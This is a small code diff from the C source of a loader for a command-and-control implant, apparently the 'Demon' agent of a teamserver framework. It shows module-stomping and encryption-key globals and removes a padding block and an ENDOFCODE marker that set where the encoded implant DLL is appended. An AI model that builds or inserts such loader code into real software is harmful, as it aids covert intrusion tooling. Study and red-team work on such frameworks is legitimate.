@@ -21,14 +21,6 @@ SEC( text, B ) WCHAR gStompTarget[ STOMP_TARGET_LEN ] = STOMP_TARGET_MARKER;
 SEC( text, B ) BYTE  gStompEnabled                    = STOMP_ENABLED_MARKER;
 SEC( text, B ) CHAR  gCryptKey[ CRYPT_KEY_LEN ]       = CRYPT_KEY_MARKER;
 
-// pad the loader to a fixed raw template size. the teamserver appends the
-// (optionally encoded) Demon DLL right after this template, and both sides
-// must agree on the exact boundary. this marker also gives extract.py a
-// clean ENDOFCODE cut.
-#define TEMPLATE_PAD_TARGET 0x800
-SEC( text, F ) BYTE gLoaderPad[ TEMPLATE_PAD_TARGET ] = { 0x0 };
-SEC( text, F ) CHAR gEndOfCode[]                      = "ENDOFCODE";
-
 SEC( text, B ) VOID Entry( VOID )
 {
     INSTANCE                Instance        = { 0 };
